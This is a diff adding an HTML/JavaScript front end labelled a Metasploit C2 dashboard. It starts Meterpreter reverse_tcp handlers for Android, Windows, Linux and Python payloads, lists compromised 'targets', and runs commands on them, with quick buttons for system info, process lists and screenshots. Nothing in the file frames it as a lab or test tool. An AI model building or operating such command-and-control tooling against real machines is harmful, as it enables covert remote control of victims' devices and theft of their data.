@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>C2 Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0e27;
+            color: #fff;
+            font-family: 'Consolas', 'Monaco', monospace;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #00ff88;
+            margin-bottom: 30px;
+            text-align: center;
+            font-size: 32px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        .panel {
+            background: #1a1f3a;
+            border: 1px solid #2a3556;
+            border-radius: 8px;
+            padding: 20px;
+        }
+        .panel h2 {
+            color: #00ff88;
+            margin-bottom: 15px;
+            font-size: 18px;
+            border-bottom: 2px solid #00ff88;
+            padding-bottom: 10px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            color: #8892b0;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            background: #0a0e27;
+            border: 1px solid #2a3556;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 14px;
+        }
+        input:focus, select:focus {
+            outline: none;
+            border-color: #00ff88;
+        }
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        .btn-start {
+            background: #00ff88;
+            color: #0a0e27;
+        }
+        .btn-start:hover {
+            background: #00cc6a;
+        }
+        .btn-stop {
+            background: #ff4444;
+            color: white;
+        }
+        .btn-stop:hover {
+            background: #cc0000;
+        }
+        .status {
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+        .status.running {
+            background: #00ff88;
+            color: #0a0e27;
+        }
+        .status.stopped {
+            background: #ff4444;
+            color: white;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #2a3556;
+        }
+        th {
+            background: #0a0e27;
+            color: #00ff88;
+            font-size: 14px;
+        }
+        td {
+            color: #ccd6f6;
+        }
+        tr:hover {
+            background: #252a45;
+            cursor: pointer;
+        }
+        .session-panel {
+            grid-column: 1 / -1;
+            display: none;
+        }
+        .terminal {
+            background: #000;
+            padding: 15px;
+            border-radius: 4px;
+            min-height: 200px;
+            max-height: 400px;
+            overflow-y: auto;
+            font-family: 'Consolas', monospace;
+            font-size: 13px;
+            margin-top: 15px;
+        }
+        .terminal-input {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .terminal-input input {
+            flex: 1;
+        }
+        .quick-commands {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .quick-btn {
+            padding: 8px;
+            background: #2a3556;
+            border: 1px solid #3a4566;
+            border-radius: 4px;
+            color: #00ff88;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.3s;
+        }
+        .quick-btn:hover {
+            background: #3a4566;
+            transform: translateY(-2px);
+        }
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: #8892b0;
+        }
+        .message {
+            padding: 10px;
+            border-radius: 4px;
+            margin-top: 10px;
+            display: none;
+        }
+        .message.success {
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid #00ff88;
+            color: #00ff88;
+        }
+        .message.error {
+            background: rgba(255, 68, 68, 0.1);
+            border: 1px solid #ff4444;
+            color: #ff4444;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ METASPLOIT C2 DASHBOARD</h1>
+        
+        <div class="grid">
+            <!-- Handler Configuration -->
+            <div class="panel">
+                <h2>🎯 Handler Configuration</h2>
+                <div class="status" id="handlerStatus">STOPPED</div>
+                
+                <div class="form-group">
+                    <label>LHOST</label>
+                    <input type="text" id="lhost" value="0.0.0.0" />
+                </div>
+                
+                <div class="form-group">
+                    <label>LPORT</label>
+                    <input type="text" id="lport" value="4444" />
+                </div>
+                
+                <div class="form-group">
+                    <label>PAYLOAD</label>
+                    <select id="payload">
+                        <option value="android/meterpreter/reverse_tcp">android/meterpreter/reverse_tcp</option>
+                        <option value="windows/meterpreter/reverse_tcp">windows/meterpreter/reverse_tcp</option>
+                        <option value="linux/x86/meterpreter/reverse_tcp">linux/x86/meterpreter/reverse_tcp</option>
+                        <option value="python/meterpreter/reverse_tcp">python/meterpreter/reverse_tcp</option>
+                    </select>
+                </div>
+                
+                <button class="btn btn-start" onclick="startHandler()">▶ START HANDLER</button>
+                <button class="btn btn-stop" onclick="stopHandler()" style="margin-left: 10px;">⏹ STOP</button>
+                
+                <div class="message" id="handlerMessage"></div>
+            </div>
+            
+            <!-- Active Targets -->
+            <div class="panel">
+                <h2>🎯 Active Targets (<span id="targetCount">0</span>)</h2>
+                <div id="targetsList"></div>
+            </div>
+            
+            <!-- Session Control -->
+            <div class="panel session-panel" id="sessionPanel">
+                <h2>💻 Session Control - <span id="sessionInfo"></span></h2>
+                
+                <div class="quick-commands">
+                    <button class="quick-btn" onclick="quickCmd('sysinfo')">📊 System Info</button>
+                    <button class="quick-btn" onclick="quickCmd('getuid')">👤 Get User</button>
+                    <button class="quick-btn" onclick="quickCmd('pwd')">📁 Working Dir</button>
+                    <button class="quick-btn" onclick="quickCmd('ifconfig')">🌐 Network Info</button>
+                    <button class="quick-btn" onclick="quickCmd('ps')">⚙️ Processes</button>
+                    <button class="quick-btn" onclick="quickCmd('screenshot')">📸 Screenshot</button>
+                </div>
+                
+                <div class="terminal" id="terminal"></div>
+                
+                <div class="terminal-input">
+                    <input type="text" id="commandInput" placeholder="Enter command..." />
+                    <button class="btn btn-start" onclick="executeCommand()">Execute</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentSession = null;
+        
+        // Update handler status
+        async function updateHandlerStatus() {
+            const response = await fetch('/api/handler/status');
+            const data = await response.json();
+            
+            const statusEl = document.getElementById('handlerStatus');
+            if (data.running) {
+                statusEl.textContent = 'RUNNING';
+                statusEl.className = 'status running';
+            } else {
+                statusEl.textContent = 'STOPPED';
+                statusEl.className = 'status stopped';
+            }
+        }
+        
+        // Start handler
+        async function startHandler() {
+            const host = document.getElementById('lhost').value;
+            const port = document.getElementById('lport').value;
+            const payload = document.getElementById('payload').value;
+            
+            const response = await fetch('/api/handler/start', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({host, port, payload})
+            });
+            
+            const data = await response.json();
+            showMessage('handlerMessage', data.success ? 'success' : 'error', data.message);
+            updateHandlerStatus();
+        }
+        
+        // Stop handler
+        async function stopHandler() {
+            const response = await fetch('/api/handler/stop', {
+                method: 'POST'
+            });
+            
+            const data = await response.json();
+            showMessage('handlerMessage', 'success', data.message);
+            updateHandlerStatus();
+        }
+        
+        // Update sessions list
+        async function updateSessions() {
+            const response = await fetch('/api/sessions');
+            const data = await response.json();
+            
+            const targetsList = document.getElementById('targetsList');
+            const targetCount = document.getElementById('targetCount');
+            
+            targetCount.textContent = data.sessions.length;
+            
+            if (data.sessions.length === 0) {
+                targetsList.innerHTML = '<div class="empty-state">No active targets</div>';
+                return;
+            }
+            
+            let html = '<table><thead><tr><th>ID</th><th>IP Address</th><th>Platform</th><th>Type</th></tr></thead><tbody>';
+            data.sessions.forEach(session => {
+                html += `<tr onclick="openSession('${session.id}', '${session.ip}', '${session.platform}')">
+                    <td>${session.id}</td>
+                    <td>${session.ip}</td>
+                    <td>${session.platform}</td>
+                    <td>${session.type}</td>
+                </tr>`;
+            });
+            html += '</tbody></table>';
+            
+            targetsList.innerHTML = html;
+        }
+        
+        // Open session
+        function openSession(id, ip, platform) {
+            currentSession = id;
+            document.getElementById('sessionInfo').textContent = `${ip} (${platform})`;
+            document.getElementById('sessionPanel').style.display = 'block';
+            document.getElementById('terminal').innerHTML = `<div style="color: #00ff88;">Session ${id} opened - ${ip}</div>`;
+        }
+        
+        // Execute command
+        async function executeCommand() {
+            if (!currentSession) return;
+            
+            const command = document.getElementById('commandInput').value;
+            if (!command) return;
+            
+            const terminal = document.getElementById('terminal');
+            terminal.innerHTML += `<div style="color: #00ff88;">$ ${command}</div>`;
+            
+            const response = await fetch('/api/execute', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    session_id: currentSession,
+                    command: command
+                })
+            });
+            
+            const data = await response.json();
+            terminal.innerHTML += `<div style="color: #ccc;">${data.output}</div>`;
+            terminal.scrollTop = terminal.scrollHeight;
+            
+            document.getElementById('commandInput').value = '';
+        }
+        
+        // Quick command
+        function quickCmd(cmd) {
+            document.getElementById('commandInput').value = cmd;
+            executeCommand();
+        }
+        
+        // Show message
+        function showMessage(id, type, text) {
+            const el = document.getElementById(id);
+            el.textContent = text;
+            el.className = `message ${type}`;
+            el.style.display = 'block';
+            setTimeout(() => el.style.display = 'none', 3000);
+        }
+        
+        // Enter key for command
+        document.getElementById('commandInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') executeCommand();
+        });
+        
+        // Auto refresh
+        setInterval(updateHandlerStatus, 3000);
+        setInterval(updateSessions, 5000);
+        
+        // Initial load
+        updateHandlerStatus();
+        updateSessions();
+    </script>
+</body>
+</html>
